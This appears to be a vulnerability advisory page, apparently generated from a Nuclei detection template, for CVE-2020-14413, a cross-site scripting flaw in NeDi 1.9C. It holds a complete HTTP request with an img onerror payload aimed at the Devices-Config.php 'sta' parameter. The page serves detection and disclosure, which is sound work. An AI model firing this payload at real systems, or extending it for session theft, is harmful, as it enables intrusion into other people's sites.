---
layout: post
cve_id: CVE-2020-14413
title: NeDi 1.9C - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2020/CVE-2020-14413.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-14413.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Upgrade to a patched version of NeDi or apply the vendor-supplied patch
  to mitigate this vulnerability.

  '
reference:
- https://gist.github.com/farid007/8db2ab5367ba00e87f9479b32d46fea8
- https://nvd.nist.gov/vuln/detail/CVE-2020-14413
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/Elsfa7-110/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2020-14413
  cwe-id: CWE-79
  epss-score: 0.15743
  epss-percentile: 0.94499
  cpe: cpe:2.3:a:nedi:nedi:1.9c:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: nedi
  product: nedi
tags:
- cve
- cve2020
- nedi
- xss
- vuln
---

## üîç Vulnerability Description
NeDi 1.9C is vulnerable to cross-site scripting because of an incorrect implementation of sanitize() in inc/libmisc.php. This function attempts to escape the SCRIPT tag from user-controllable values, but can be easily bypassed, as demonstrated by an onerror attribute of an IMG element as a Devices-Config.php?sta= value.

## üåê HTTP Request
```nohighlight
GET /Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.10
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

